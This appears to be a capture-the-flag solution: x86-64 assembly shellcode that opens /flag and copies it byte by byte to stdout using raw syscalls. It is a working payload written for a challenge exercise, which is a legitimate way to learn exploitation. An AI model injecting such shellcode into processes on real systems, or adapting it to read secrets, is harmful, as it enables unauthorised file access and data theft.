BITS 64

; open /flag
mov eax, 2
mov rdi, 0x67616c662f
push rdi
mov rdi, rsp
mov esi, 0 ; O_RDONLY
xor edx, edx ; flags
syscall
cmp rax, 0
jl fail
mov r12, rax

; read/write the flag to stdout byte-by-byte
rw_loop:
mov eax, 0
mov rdi, r12
mov rsi, rsp
mov edx, 1
syscall
cmp rax, 0
je succeed
jl fail

mov eax, 1
mov rdi, 1
mov rsi, rsp
mov edx, 1
syscall
cmp rax, 1
jne fail

jmp rw_loop

fail:
ud2

succeed:
mov eax, 60
mov edi, 0
syscall
